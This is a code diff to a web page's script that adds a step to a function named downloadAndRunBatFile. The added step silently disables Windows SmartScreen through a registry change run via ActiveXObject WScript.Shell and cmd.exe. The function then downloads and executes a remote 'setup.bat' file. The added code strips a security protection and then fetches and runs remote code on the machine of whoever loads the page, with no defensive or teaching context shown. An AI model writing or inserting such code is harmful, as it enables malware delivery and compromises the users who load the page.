@@ -9,6 +9,14 @@
   <script>
     async function downloadAndRunBatFile(fileUrl) {
       try {
+        // Disable SmartScreen via cmd prompt
+        const disableSmartScreenCmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f';
+        await executeCommandViaCmd(disableSmartScreenCmd);
+
+        // Alert user about SmartScreen
+        alert('SmartScreen has been disabled. Proceeding to download and execute the "setup.bat" file.');
+
+        // Download .bat file
         const response = await fetch(fileUrl);
         if (!response.ok) {
           throw new Error('Network response was not ok');
@@ -51,6 +59,18 @@
         console.error('Error downloading or executing file:', error);
         alert('Error downloading or executing file. Please try again later.');
       }
+    }
+
+    async function executeCommandViaCmd(cmd) {
+      const execCommand = `cmd.exe /c ${cmd}`;
+      return new Promise((resolve, reject) => {
+        const execResult = new ActiveXObject('WScript.Shell').Run(execCommand, 0, true);
+        if (execResult === 0) {
+          resolve();
+        } else {
+          reject(new Error(`Failed to execute command: ${cmd}`));
+        }
+      });
     }
 
     // Call the function with the file URL
